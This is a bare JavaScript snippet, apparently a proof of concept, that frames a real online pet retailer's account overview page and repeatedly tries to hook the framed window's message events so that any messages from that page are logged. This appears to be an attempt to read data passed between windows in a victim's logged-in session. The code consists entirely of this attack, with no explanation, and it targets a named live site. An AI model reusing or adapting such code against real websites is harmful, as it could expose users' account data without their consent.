var a=document.createElement("iframe");
a.src="https://www.zooplus.com/account/overview";
a.name="mainsite";
document.body.appendChild(a);
function onmessagehandler(){
  mainsite.window.addEventListener("message",console.log)
}
setInterval(onmessagehandler, 1000);
